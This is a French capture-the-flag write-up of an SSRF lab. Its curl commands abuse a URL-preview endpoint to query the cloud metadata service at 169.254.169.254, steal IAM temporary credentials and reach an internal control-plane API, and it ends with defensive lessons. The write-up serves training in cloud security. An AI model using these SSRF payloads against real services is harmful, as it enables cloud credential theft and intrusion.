# Compte rendu : SSRF Attack - Steal Cloud Metadata Credentials
Plateforme : HackerDNA ( https://hackerdna.com/labs/ssrf-attack-cloud-metadata-credentials )
Auteur : SRH
Catégorie : Web Exploitation / Cloud Penetration Testing
Tags : SSRF, Cloud Penetration Testing, AWS IMDS, IMDSv2, IAM Credential Theft, Metadata Service Abuse, API Enumeration
XP : +200 XP

## Scénario
Exploiter un endpoint de preview d'URL vulnérable à SSRF pour voler les credentials cloud de l'instance, puis les utiliser pour accéder à une API interne de contrôle.

Application cible : **Previewly** - un service de preview d'URL.
Fonctionnalité vulnérable : `/api/unfurl` - récupère une URL fournie par l'utilisateur et retourne son contenu.

Objectif : SSRF → Metadata Service → IAM Credentials → Control-Plane API → Flags.

## Chaîne d'Attaque
[Endpoint /api/unfurl] → [SSRF vers 169.254.169.254] → [IAM Role : previewly-fetcher-role] → [Temporary Credentials / Session Token] → [User-Data : Flag User] → [API /control-plane/ authentifiée] → [Flag Root] → 🚩

## Étape 1 — Vérification de la vulnérabilité SSRF

```bash
curl "http://$TARGET/api/unfurl" --json '{"url": "http://169.254.169.254/latest/meta-data/"}'
```

Réponse : liste des métadonnées, dont `iam/security-credentials/` et `user-data`.

## Étape 2 — Énumération du rôle IAM

```bash
curl "http://$TARGET/api/unfurl" --json '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

Résultat :

```
previewly-fetcher-role
```

## Étape 3 — Vol des credentials temporaires

```bash
curl "http://$TARGET/api/unfurl" --json '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/previewly-fetcher-role"}'
```

Réponse :

```json
{
  "AccessKeyId": "[ACCESS_KEY]",
  "SecretAccessKey": "[SECRET_KEY]",
  "Token": "[SESSION_TOKEN]",
  "Expiration": "[DATE]"
}
```

## Étape 4 — Récupération du Flag User via user-data

```bash
curl "http://$TARGET/api/unfurl" --json '{"url": "http://169.254.169.254/latest/user-data"}'
```

Contenu :

```
# Previewly worker bootstrap (managed by Terraform)
# Internal control-plane API at /control-plane/ on this host
# (authenticate with the role session token)
FLAG{...} - Flag User
```

🚩 Flag User : FLAG{...}

## Étape 5 — Énumération de l'API /control-plane/

```bash
curl "http://$TARGET/control-plane/" -H "Authorization: Bearer [SESSION_TOKEN]"
```

## Étape 6 — Récupération du Flag Root

```bash
curl "http://$TARGET/control-plane/flag" -H "Authorization: Bearer [SESSION_TOKEN]"
```

🚩 Flag Root : FLAG{...}

## Conclusion
SSRF → 169.254.169.254 → Credentials IAM → API interne → Flags.
C'est le scénario classique Capital One : une feature anodine devient un vol d'identité cloud complet.

## Leçons Apprises
1. Allowlist stricte sur les URLs fetchées par le serveur.
2. Bloquer les IP privées / link-local : `169.254.0.0/16`, `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`.
3. Utiliser IMDSv2 avec hop limit = 1.
4. Moindre privilège sur le rôle IAM.
5. Jamais de secrets dans le user-data.

Les noms des défis et toute propriété intellectuelle de tiers restent la propriété de leurs détenteurs respectifs.
